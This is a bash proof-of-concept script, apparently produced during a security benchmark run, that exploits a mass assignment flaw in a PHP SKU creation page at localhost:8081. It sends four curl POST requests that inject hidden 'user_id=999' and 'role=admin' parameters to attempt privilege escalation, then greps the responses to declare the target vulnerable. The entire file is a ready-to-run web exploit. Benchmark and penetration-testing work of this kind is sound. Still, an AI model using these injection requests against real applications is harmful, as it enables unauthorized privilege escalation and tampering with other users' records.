#!/bin/bash
# POC: Demonstrates mass assignment vulnerability in SKU creation by injecting hidden parameters (user_id, role) not present in the HTML form
# Target: ./repo
# Created: 2025-12-01T15:51:12.939Z
# Session: benchmark-XBEN-092-24-minbdcli

# Mass Assignment Vulnerability POC
# Demonstrates parameter injection of hidden fields in SKU creation form
# The vulnerability allows injecting undeclared parameters like user_id and role

TARGET_URL="http://localhost:8081/sku_add.php"

echo "[*] Mass Assignment POC - SKU Creation Hidden Parameter Injection"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Normal request with form fields only
echo "[+] Test 1: Normal request with declared fields (sku, name, description)"
echo "POST Data: sku=TEST_NORMAL&name=Normal_Test&description=Normal_Description"
RESPONSE1=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'sku=TEST_NORMAL&name=Normal_Test&description=Normal_Description')
echo "Response: $RESPONSE1"
echo ""

# Test 2: Inject hidden user_id parameter
echo "[+] Test 2: Inject hidden 'user_id' parameter (not in HTML form)"
echo "POST Data: sku=TEST_USERID&name=User_Injection&description=Test&user_id=999"
RESPONSE2=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'sku=TEST_USERID&name=User_Injection&description=Test&user_id=999')
echo "Response: $RESPONSE2"
echo ""

# Test 3: Inject hidden role parameter for privilege escalation
echo "[+] Test 3: Inject hidden 'role' parameter (privilege escalation attempt)"
echo "POST Data: sku=TEST_ROLE&name=Role_Injection&description=Test&role=admin"
RESPONSE3=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'sku=TEST_ROLE&name=Role_Injection&description=Test&role=admin')
echo "Response: $RESPONSE3"
echo ""

# Test 4: Inject both user_id and role parameters
echo "[+] Test 4: Inject both 'user_id' and 'role' parameters (combined attack)"
echo "POST Data: sku=TEST_BOTH&name=Combined_Attack&description=Test&user_id=999&role=admin"
RESPONSE4=$(curl -s -X POST "$TARGET_URL" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'sku=TEST_BOTH&name=Combined_Attack&description=Test&user_id=999&role=admin')
echo "Response: $RESPONSE4"
echo ""

# Analysis
echo "[*] Analysis:"
if echo "$RESPONSE2" | grep -q "created\|success\|Record"; then
  echo "[!] VULNERABLE: user_id parameter was accepted without error"
else
  echo "[*] user_id parameter rejection status unclear"
fi

if echo "$RESPONSE3" | grep -q "created\|success\|Record"; then
  echo "[!] VULNERABLE: role parameter was accepted without error"
else
  echo "[*] role parameter rejection status unclear"
fi

if echo "$RESPONSE4" | grep -q "created\|success\|Record"; then
  echo "[!] VULNERABLE: Both user_id and role parameters were accepted without error"
  echo "[!] CRITICAL: Mass assignment vulnerability confirmed - hidden parameters are processed"
else
  echo "[*] Combined parameter rejection status unclear"
fi

echo ""
echo "[*] POC Complete - Check responses above to confirm parameter acceptance"